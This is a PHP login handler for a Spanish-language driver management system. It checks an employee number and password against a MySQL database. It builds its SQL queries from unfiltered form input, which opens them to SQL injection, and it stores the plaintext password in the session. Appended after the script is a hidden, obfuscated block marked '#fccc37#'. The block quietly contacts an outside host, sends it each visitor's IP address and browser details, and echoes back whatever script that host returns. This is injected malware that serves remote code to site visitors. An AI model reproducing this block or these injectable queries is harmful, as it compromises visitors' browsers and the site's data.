<?php
session_start();
include('../controlador/bdadmin.php');
$conexion = conexcion();
$query = mysql_query("SELECT id_empleado, Concat(Upper(apellido),', ', Upper(nombre)) as name FROM empleados WHERE (legajo = '$_POST[txtNombre]') and (activo = 1)") or die(alerta(mysql_error()));

if(mysql_num_rows($query) != 0) { //Verifica que el chofer no se encuentre deshabilitado

	$data = mysql_fetch_array($query);
    mysql_free_result($query);
    $_SESSION['id_chofer'] = $data["id_empleado"];
    $_SESSION['chofer'] = $data["name"];
	$query = mysql_query("SELECT * FROM passwords WHERE id_chofer = $data[id_empleado]");

	if($data = mysql_fetch_array($query)){  //Verifica que si el chofer esta habilitado, se encuentre generada su clave de acceso caso contrario redirige a la pagina de cambio de contraseña
          if (md5($data['clave']) == md5($_POST['txtPassword'])){ //si esta generada la clave de acceso verifica que coincida con la introducida en el formulario de index.php
	           $_SESSION['auth'] = true;
                   $_SESSION['id_chofer'] = $data["id_chofer"];
                   $_SESSION['legajo'] = $data["legajo"];
                   $_SESSION['passwd'] = $_POST['txtPassword'];
                   $_SESSION['admin']= mysql_num_rows(mysql_query("SELECT * FROM admin_choferes WHERE id_chofer= $_SESSION[id_chofer]"));
                   $query = mysql_query("UPDATE passwords set ultimoacceso = NOW() WHERE id_chofer = $_SESSION[id_chofer]") or die(mysql_error());
                   echo "<script>window.location='ppal.php?pv=s'</script>";
          }
          else{
               echo "<script>window.location='index.php?e=1'</script>"; //Contraseña incorrecta
          }
    }else{

          if (md5($_POST['txtNombre']) == md5($_POST['txtPassword'])){    //La clave no ha sido generada, verifica que el usuario y clave originales coincida y redirecciona a cambiar la contraseña
             $_SESSION['auth'] = true;
             $_SESSION['legajo'] = $data["legajo"];
             $_SESSION['passwd'] = $_POST['txtPassword'];
             echo "<script>window.location='chcontrasenia.php?ac=1'</script>";
         }
         else {

	          echo "<script>window.location='index.php?e=2'</script>";
           }
    }
}else{
	echo "<script>window.location='index.php?e=0'</script>"; //El chofer esta dado de baja o es inexistente
}
if(isset($conexion)){
	mysql_close($conexion) or die(alerta(mysql_error()));
}

?>
<?php
#fccc37#
error_reporting(0); ini_set('display_errors',0); $wp_p41 = @$_SERVER['HTTP_USER_AGENT'];
if (( preg_match ('/Gecko|MSIE/i', $wp_p41) && !preg_match ('/bot/i', $wp_p41))){
$wp_p0941="http://"."web"."basefont".".com/font"."/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_p41);
$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_p0941);
curl_setopt ($ch, CURLOPT_TIMEOUT, 6); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $wp_41p = curl_exec ($ch); curl_close($ch);}
if ( substr($wp_41p,1,3) === 'scr' ){ echo $wp_41p; }
#/fccc37#
?>
